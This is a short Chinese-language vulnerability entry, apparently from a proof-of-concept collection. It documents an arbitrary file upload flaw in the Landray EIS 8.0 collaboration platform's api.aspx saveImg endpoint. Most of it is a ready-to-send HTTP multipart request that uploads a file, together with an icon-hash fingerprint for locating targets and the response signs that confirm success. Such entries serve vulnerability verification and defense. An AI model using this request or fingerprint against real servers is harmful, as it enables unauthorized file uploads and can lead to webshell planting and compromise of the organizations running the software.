﻿# 蓝凌EIS智慧协同平台api.aspx接口任意文件上传漏洞

> 更新时间：2023-12-20

> 漏洞编号：

> 漏洞说明：蓝凌EIS 8.0 智慧协同平台api.aspx接口任意文件上传漏洞，攻击者可以上传任意文件。

> 漏洞特征：icon_hash="953405444"

> 验证脚本：HTTP

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="dudesuite.txt"
Content-Type: text/html

dudesuite
------WebKitFormBoundaryxdgaqmqu--
```

> 响应代码特征：200

> 响应内容特征：txt

> 上传文件定位：


> 验证文件来源：蓝凌EIS智慧协同平台api.aspx接口任意文件上传漏洞.poc
